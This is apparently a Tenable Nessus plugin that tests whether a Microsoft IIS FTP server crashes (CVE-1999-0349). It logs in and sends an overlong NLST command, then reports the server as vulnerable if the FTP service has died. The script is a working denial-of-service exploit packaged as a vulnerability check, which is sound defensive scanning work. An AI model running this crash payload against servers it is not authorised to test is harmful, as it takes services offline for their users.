#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10118);
 script_version ("$Revision: 1.40 $");
 script_cve_id("CVE-1999-0349");
 script_bugtraq_id(192);

 script_name(english:"Microsoft IIS FTP Server NLST Command Overflow DoS");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a denial of service 
vulnerability." );
 script_set_attribute(attribute:"description", value:
"It is possible to make the IIS FTP server close all the active 
connections by issuing a too long NLST command, which will make the
server crash. An attacker can use this flaw to prevent people from
downloading data from your FTP server." );
 script_set_attribute(attribute:"see_also", value:"http://technet.microsoft.com/en-us/security/bulletin/ms99-003" );
 script_set_attribute(attribute:"solution", value:
"Apply the patch referenced above." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");

 script_set_attribute(attribute:"plugin_publication_date", value: "1999/06/22");
 script_set_attribute(attribute:"vuln_publication_date", value: "1999/01/24");
 script_cvs_date("$Date: 2012/03/09 22:41:21 $");
 script_osvdb_id(929);
script_xref(name:"MSFT", value: "MS99-003");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:microsoft:iis");
script_end_attributes();

 script_category(ACT_DENIAL);
 script_family(english:"FTP");
 script_copyright(english:"This script is Copyright (C) 1999-2012 Tenable Network Security, Inc.");
 script_dependencie("ftpserver_detect_type_nd_version.nasl", "ftp_anonymous.nasl");
 script_summary(english:"Crashes an IIS ftp server");
 script_require_ports("Services/ftp", 21);
 script_require_keys("ftp/login");
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include('misc_func.inc');
include('ftp_func.inc');

login = get_kb_item_or_exit("ftp/login");
password = get_kb_item("ftp/password");

port = get_ftp_port(default: 21);

soc = open_sock_tcp(port);
if (! soc) exit(1);

 if(ftp_authenticate(socket:soc, user:login, pass:password))
 {
  port2 = ftp_pasv(socket:soc);
  if (!port2) exit(1);
  soc2 = open_sock_tcp(port2, transport:get_port_transport(port));
  command = strcat('NLST ', crap(320), '\r\n');
  send(socket:soc, data:command);
  close(soc2);
 }
 close(soc);
 
if (service_is_dead(port: port) > 0)
  security_warning(port);
